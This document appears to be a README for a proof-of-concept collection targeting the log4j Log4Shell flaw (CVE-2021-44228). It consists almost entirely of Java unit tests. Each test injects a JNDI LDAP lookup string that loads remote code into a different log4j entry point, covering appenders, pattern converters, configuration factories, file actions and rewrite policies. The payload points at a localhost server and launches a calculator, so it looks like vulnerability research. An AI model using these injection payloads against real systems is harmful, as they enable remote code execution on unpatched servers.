# Poc List For log4j Library

This projects is a poc list for *log4j* java library, which extends default poc for CVE-2021-44228. Required version <= 2.14.0

## Pre-Requirements

**config.json**

```
{
  "injectedObject": {
    "injectedProperty": "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"
  }
}
```

## Pocs for FileManager Tree

**RollingFileManager.build()**

```
@Test
    public void buildRollingFileManager(){
        PatternLayout layout = PatternLayout.newBuilder()
                .withConfiguration(new DefaultConfiguration())
                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
                .build();

        RollingFileAppender appender = RollingFileAppender.newBuilder().setConfiguration(new DefaultConfiguration())
                .withFileName("app.log")
                .withFilePattern("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}")
                .setLayout(layout)
                .withAppend(true)
                .setName("RollingFile")
                .withPolicy(OnStartupTriggeringPolicy.createPolicy(1))
                .withStrategy(DefaultRolloverStrategy.newBuilder()
                        .withMax(String.valueOf(3))
                        .withConfig(new DefaultConfiguration())
                        .withFileIndex("min")
                        .build())
                .build();

        appender.getManager().rollover();
    }
```

## Pocs for Context Tree ##

**LogManager.getContext()**

```
@Test
    public void getContextPocTest(){
        URI configUri = new File("config.json").toURI();
        LoggerContext context = (LoggerContext) LogManager.getContext(null, false, configUri);
    }
```

## Pocs for Pattern Converters ##

**MessagePatternConverter.format()**

```
  @Test
    public void formatMessagePatternConverterTest() {
        Configuration configuration = new DefaultConfiguration();
        MessagePatternConverter messagePatternConverter = MessagePatternConverter.newInstance(configuration, new String[]{"lookups"});
        LogEvent logEvent = new MutableLogEvent(new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"), null);
        messagePatternConverter.format(logEvent, new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"));
    }
```

**PatternFormatter.format()**

```
  @Test
    public void formatPatternFormatterTest() {
        Configuration configuration = new DefaultConfiguration();
        String pattern = "%m";
        PatternParser parser = new PatternParser(configuration, "Converter", null);
        List<PatternFormatter> formatters = parser.parse(pattern);
        LogEvent logEvent = new MutableLogEvent(new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"), null);
        for (PatternFormatter formatter : formatters) {
            formatter.format(logEvent, new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"));
        }
    }
```

**LiteralPatternConverter.format()**

```
    @Test
    public void formatLiteralPatternConverterTest() {
        Configuration configuration = new DefaultConfiguration();
        LiteralPatternConverter literalConverter = new LiteralPatternConverter(configuration, "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}", false);
        LogEvent logEvent = new MutableLogEvent(new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"), null);
        literalConverter.format(logEvent, new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"));
    }
```

**PatternProcessor.formatFileName()**

```
 @Test
    public void formatFileNamePatternProcessor() {
        Configuration configuration = new DefaultConfiguration();
        String pattern = "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}";
        PatternProcessor processor = new PatternProcessor(pattern);
        processor.formatFileName(configuration.getStrSubstitutor(), new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"), true, null);
    }
```

## Pocs for Action Tree ##

**DeleteAction.execute()**

```
@Test
    public void executeDeleteActionTest() {
        DeleteAction action = DeleteAction.createDeleteAction("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}", false, 1, true, null , new PathCondition[]{
                IfFileName.createNameCondition(String.format("%s-*.log.zip", "appname"), null, IfAccumulatedFileCount.createFileCountCondition(1))
        }, null, new DefaultConfiguration());
    }
```

**PosixViewAttributeAction.execute()**
```
  @Test
    public void executePosixViewAttributeAction() throws IOException {
     PosixViewAttributeAction action = PosixViewAttributeAction.newBuilder().withPathConditions(new PathCondition[]{
            IfFileName.createNameCondition(String.format("%s-*.log.zip", "appname"), null, IfAccumulatedFileCount.createFileCountCondition(1))
        }).withFilePermissionsString("rwxrwxrwx").withBasePath("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}").withConfiguration(new DefaultConfiguration()).build();
        action.execute();
    }
```

## Pocs for Config Tree ##

**JSONConfigurationFactory.getConfiguration()**
```
 @Test
    public void getConfigurationJSONConfigurationFactoryTest() throws IOException {
        String jsonConfig = "{\"injectedObject\": {\"injectedProperty\":\"${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}\"}}";
        ByteArrayInputStream bis = new ByteArrayInputStream(jsonConfig.getBytes(StandardCharsets.UTF_8));
        ConfigurationSource source = new ConfigurationSource(bis);

        JsonConfigurationFactory factory = new JsonConfigurationFactory();
        Configuration config = factory.getConfiguration(new LoggerContext("testContext"), source);
    }
```

**LoggerContext.setConfigLocation()**
```
@Test
    public void setConfigLocationUriTest()  {
        URI configUri = new File("config.json").toURI();
        LoggerContext context = (LoggerContext) LogManager.getContext(false);
        context.setConfigLocation(configUri);
    }
```

**ConfigurationFactory.getConfiguration()**

Required dedpendecies
```
implementation("com.fasterxml.jackson.core:jackson-databind:2.17.0")
```

```
 @Test
    public void getConfigurationConfigurationFactoryTest() throws IOException {
        String configText = "{"
                + "\"Configuration\": {"
                + "    \"injectedProperty\": \"${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}\""
                + "}"
                + "}";
        ByteArrayInputStream bis = new ByteArrayInputStream(configText.getBytes(StandardCharsets.UTF_8));
        ConfigurationSource source = new ConfigurationSource(bis, new File("config.json"));
        Configuration config = ConfigurationFactory.getInstance().getConfiguration(new LoggerContext("testContext"), source);
    }
```

**YamlConfigurationFactory.getConfiguration()**

Required dedpendecies
```
implementation("com.fasterxml.jackson.dataformat:jackson-dataformat-yaml:2.17.1")
```

```
@Test
    public void getConfigurationYamlConfigurationFactoryTest() throws IOException {
        String yamlConfig = "Configuration:\n" +
                "  injectedProperty: \"${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}\"";
        ByteArrayInputStream bis = new ByteArrayInputStream(yamlConfig.getBytes(StandardCharsets.UTF_8));
        ConfigurationSource source = new ConfigurationSource(bis);

        YamlConfigurationFactory factory = new YamlConfigurationFactory();
        Configuration config = factory.getConfiguration(new LoggerContext("testContext"), source);
    }
```

**LoggerContextAdminMBean.setConfigLocationUri()**

```
    @Test
    public void setConfigLocationUriLoggerContextAdminMBeanTest() throws Exception {
        LoggerContext context = new LoggerContext("testContext");
        LoggerContextAdminMBean mBean = new LoggerContextAdmin(context, new Executor() {
            @Override
            public void execute(Runnable command) {
                command.run();
            }
        });
        URI newConfigUri = new File("config.json").toURI();
        mBean.setConfigLocationUri(newConfigUri.toString());
    }
```

**CompositeConfiguration.reconfigure()**
```
 @Test
    public void reconfigureCompositeConfigurationTest() throws Exception {
        ConfigurationBuilder<BuiltConfiguration> builder = ConfigurationBuilderFactory.newConfigurationBuilder();
        AbstractConfiguration config = builder.addProperty("injectedProperty", "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}").build();
        CompositeConfiguration compositeConfig = new CompositeConfiguration(Arrays.asList(config));
        compositeConfig.reconfigure();
    }
```

#### Pocs for Rewriter Tree ####

**PropertiesRewritePolicy.rewrite()**

```
@Test
    public void rewritePropertiesRewritePolicyTest() {
        Configuration configuration = new DefaultConfiguration();
        Property[] properties = new Property[]{
                Property.createProperty("injectedProperty", "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}")
        };

        RewritePolicy policy = PropertiesRewritePolicy.createPolicy(configuration, properties);
        LogEvent logEvent = new MutableLogEvent(new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"), null);
        LogEvent rewrittenEvent = policy.rewrite(logEvent);
    }
```

**RewritePolicy.append()**

```
@Test
    public void appendRewritePolicyTest() {
        LoggerContext context = new LoggerContext("TestContext");
        Configuration config = context.getConfiguration();

        Appender consoleAppender = ConsoleAppender.createDefaultAppenderForLayout(PatternLayout.createDefaultLayout(config));
        consoleAppender.start();

        AppenderRef appenderRef = AppenderRef.createAppenderRef("console", null, null);
        AppenderRef[] refs = new AppenderRef[]{appenderRef};

        Property[] properties = new Property[]{
                Property.createProperty("injectedProperty", "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}")
        };
        RewritePolicy rewritePolicy = PropertiesRewritePolicy.createPolicy(config, properties);

        RewriteAppender rewriteAppender = RewriteAppender.createAppender(
                "rewriteAppender",
                "false",
                refs,
                config,
                rewritePolicy,
                ThresholdFilter.createFilter(Level.ALL, null, null)
        );
        rewriteAppender.start();


        config.addAppender(consoleAppender);
        config.addAppender(rewriteAppender);
        context.updateLoggers();

        LogEvent logEvent = new MutableLogEvent(new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"), null);
        rewriteAppender.append(logEvent);

        rewriteAppender.stop();
        consoleAppender.stop();
    }
```
